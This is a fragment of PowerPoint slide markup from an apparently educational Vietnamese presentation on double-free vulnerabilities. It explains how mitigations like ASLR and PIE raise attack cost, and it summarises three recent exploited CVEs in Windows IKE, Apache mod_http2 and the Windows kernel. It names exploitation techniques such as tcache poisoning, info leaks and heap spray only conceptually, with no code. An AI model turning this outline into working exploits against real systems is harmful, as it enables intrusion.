            <a:off x="640080" y="5029200"/>
            <a:ext cx="10908792" cy="1078992"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Các lớp độc lập nhau theo thiết kế: attacker phải vượt gần hết cùng lúc. Nhưng chỉ một lớp bị tắt hoặc cấu hình sai (binary không PIE, tắt ASLR để debug) là độ khó của cả chuỗi giảm hẳn.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="15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Vì sao vẫn có CVE dù đủ lớp bảo vệ</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7.3 · TÁC ĐỘNG KHÁC ĐIỀU KIỆN KHAI THÁC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="5120640" cy="4800600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1524"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1581912"/>
            <a:ext cx="4754880"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KẾT LUẬN PHẦN 05</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1874520"/>
            <a:ext cx="4754880" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Bảo vệ tăng chi phí, không xoá lớp lỗi</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3108960"/>
            <a:ext cx="4754880" cy="2999232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Allocator chặn double free trực tiếp thì attacker chuyển sang tcache poisoning. Có chunk tại địa chỉ tuỳ ý cũng chưa phải chiếm luồng: còn ASLR, PIE, NX, RELRO. Nhưng khi điều kiện ở 7.1 thoả trong một triển khai cụ thể, chuỗi vẫn đi hết.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5806440" y="1417320"/>
            <a:ext cx="5925312" cy="1453896"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5031"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5989320" y="1581912"/>
            <a:ext cx="555955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CVE-2026-23918</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5989320" y="1874520"/>
            <a:ext cx="5559552" cy="886968"/>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Cần thêm info leak và heap spray trước khi có RCE, đúng như dự đoán: ASLR chỉ tăng chi phí</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5806440" y="3090672"/>
            <a:ext cx="5925312" cy="1453896"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5031"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5989320" y="3255264"/>
            <a:ext cx="555955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CẤU HÌNH TRIỂN KHAI</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5989320" y="3547872"/>
            <a:ext cx="5559552" cy="886968"/>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Điều kiện RCE phụ thuộc APR dùng mmap allocator, không chỉ phụ thuộc bản thân lỗi</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5806440" y="4764024"/>
            <a:ext cx="5925312" cy="1453896"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5031"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5989320" y="4928616"/>
            <a:ext cx="5559552"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CÁCH ĐỌC PHẦN 06</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5989320" y="5221224"/>
            <a:ext cx="5559552" cy="886968"/>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Tách rõ Tác động (worst case) và Điều kiện khai thác (khi nào worst case đạt được)</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731520" y="640080"/>
            <a:ext cx="4572000" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="14000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>07</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="100" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="3063240"/>
            <a:ext cx="6949440" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE thực tế 2025–2026</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="body" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="4343400"/>
            <a:ext cx="6949440" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Yêu cầu 4 · sản phẩm, nguyên nhân, tác động, điều kiện khai thác, khắc phục</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="914400"/>
            <a:ext cx="3593592" cy="5120640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2036"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8366760" y="1143000"/>
            <a:ext cx="3108960" cy="27432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NỘI DUNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8366760" y="1554480"/>
            <a:ext cx="3154680" cy="4297680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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CVE-2026-33824</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CVE-2026-23918</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CVE-2025-62215</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Điểm chung</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Ba CVE double free đã bị khai thác thực tế</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4 · CWE-415 · 2025–2026</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="3605784" cy="4800600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2029"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1645920"/>
            <a:ext cx="3148584" cy="22860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2026 · WINDOWS IKE EXTENSION</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1965960"/>
            <a:ext cx="3148584" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CVE-2026-33824</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2514600"/>
            <a:ext cx="3148584" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="7200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>9.8</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="7200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="3703320"/>
            <a:ext cx="3148584" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVSS · Critical</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="4206240"/>
            <a:ext cx="3148584" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>double free → RCE từ xa không xác thực</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="5257800"/>
            <a:ext cx="3148584" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Đã khai thác · CISA KEV 18/8/2026</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4291584" y="1417320"/>
            <a:ext cx="3605784" cy="4800600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2029"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4520184" y="1645920"/>
            <a:ext cx="3148584" cy="22860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2026 · APACHE HTTPD 2.4.66</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4520184" y="1965960"/>
            <a:ext cx="3148584" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CVE-2026-23918</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4520184" y="2514600"/>
            <a:ext cx="3148584" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="7200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>8.8</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="7200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4520184" y="3703320"/>
            <a:ext cx="3148584" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVSS · High</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4520184" y="4206240"/>
            <a:ext cx="3148584" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>double free trong mod_http2 → DoS/RCE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4520184" y="5257800"/>
            <a:ext cx="3148584" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Đã khai thác DoS thực tế</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8125968" y="1417320"/>
            <a:ext cx="3605784" cy="4800600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2029"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8354568" y="1645920"/>
            <a:ext cx="3148584" cy="22860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2025 · WINDOWS KERNEL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8354568" y="1965960"/>
